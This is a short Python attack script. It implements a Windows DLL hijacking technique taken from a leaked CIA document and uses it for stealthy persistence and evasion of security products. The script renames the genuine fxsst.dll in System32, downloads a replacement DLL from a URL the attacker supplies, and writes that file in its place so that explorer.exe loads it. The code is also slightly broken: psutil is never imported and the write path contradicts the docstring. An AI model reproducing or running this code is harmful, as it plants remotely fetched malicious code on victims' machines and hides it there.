"""
https://wikileaks.org/ciav7p1/cms/page_2621760.html
	
This is a simple DLL hijacking attack that we have successfully tested against
Windows XP,Vista and 7. A DLL named fxsst.dll normally resides in \Windows\System32
and is loaded by explorer.exe. Placing a new DLL with this name in \Windows results
in this being loaded into explorer instead of the original DLL. On Windows Vista
and above, the DLL's reference count must be increased by calling LoadLibrary
on itself to avoid being unloaded. This achieves persistence, stealth and in some
cases PSP avoidance.
"""
import os
import requests

def fax_dll_hijack(url,rename_dll):
	dll = "fxsst.dll"
	dll_path = "C:\Windows\System32"

	for process in psutil.process_iter():
		if "explorer.exe" in str(process.name):
			for loaded_dlls in psutil.Process(process.pid).memory_maps():
				if dll in loaded_dlls.path:	
					if (rename_dll == 1):
						if (os.path.isfile(os.path.join(dll_path,dll)) == True):
							try:
								os.rename(os.path.join(dll_path,dll),os.path.join(dll_path,"fxsst.dll.old"))
							except Exception as e:
								return False
					try:
						download = requests.get(url)
						if (len(download.content) > 1):
							with open(os.path.join(dll_path,dll),"wb") as dll_file:
								dll_file.write(download.content)
								dll_file.close()
							if (os.path.isfile(os.path.join(dll_path,dll)) == True):
									pass
							else:
								return False
						else:
							return False
					except Exception as e:
						return False
